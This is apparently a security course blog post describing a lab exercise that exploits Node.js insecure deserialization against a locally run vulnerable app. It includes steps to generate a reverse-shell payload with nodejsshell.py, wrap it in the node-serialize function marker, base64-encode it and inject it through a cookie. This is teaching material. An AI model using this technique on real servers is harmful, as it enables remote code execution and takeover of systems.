---
layout: post
title: Week 8
---

# Insecure Deserialization
Serialization is the process where an object is encoded into a byte-stream which can be transferred across a network. It is then de-serialized to recover the object. Depending on the application, serialized objects may include executable instructions or authentication credentials. These serialized objects may be modified by an adversary. If the application is not able to detect tampering, it can allow the adversary to achieve effects like remote code execution or privilege escalation on the server.

### Exercise 
**Note:** Since this excercise gains access into the server we are unable to exploit the live vulnerable web app hosted in Heroku as they have added security on their back to prevent this kinds of attacks.    

1. Setup: 
- Clone or download https://github.com/ajinabraham/Node.Js-Security-Course.git
- On a seperate folder clone or download https://github.com/ashwinsawant/sbr.git and checkout branch Deserial. Run command 'npm start' to run web app locally on port 3000. 

     ![Local Host](/images/week8_npmStart.JPG)

2. Open Burp, go to Proxy > Options and make sure 127.0.0.1:8080 Proxy Listener is enabled. Then go to Firefox and change manual proxy settings to match Burp's.

     ![Burp Proxy](/images/week8_Proxy.JPG)

3. On Burp go to Proxy > Intercept and make sure Intercept is on. On Firefox go to localhost:3000/login and enter the following credentials at the login page: **Email:** cocho@gmail.com and **Password:** password      
Read carefully after GET you will see an api/login click Forward and then you will see a GET /setCookies, this is the request we are interested in.  We have just intercepted traffic and now have access to the encryted cookie along with the request format. Click on Action button and Send to Repeater. We will use later on in the process.   

   ![Burp Intercept](/images/week8_Cookie.JPG)

4. Go to the Node.Js-Security-Course folder and opent terminal and run the following command: `python nodejsshell.py 127.0.0.1 3333`
Copy text everything after eval(  and paste it in Burp's Decoder tab. 

   ![Python Scrypt](/images/week8_python.JPG)
   
5. Copy paste or typethe following on the Decoder tab before eval `{"rce":"_$$ND_FUNC$$_function (){ ` and copy paste or type `}()"}` at the end after 10)) Click on Encode as and select Base 64 to get a long string of characters. 

    ![Decoder](/images/week8_base64.JPG)

6. Copy the encoded string and got to the Repeater tab, replace the red text after profile= with the string and click Send. 
### References
- https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
- https://www.yeahhub.com/nodejs-deserialization-attack-detailed-tutorial-2018/
- https://expressjs.com/en/resources/middleware/cookie-parser.html

# Insufficient Logging & Monitoring
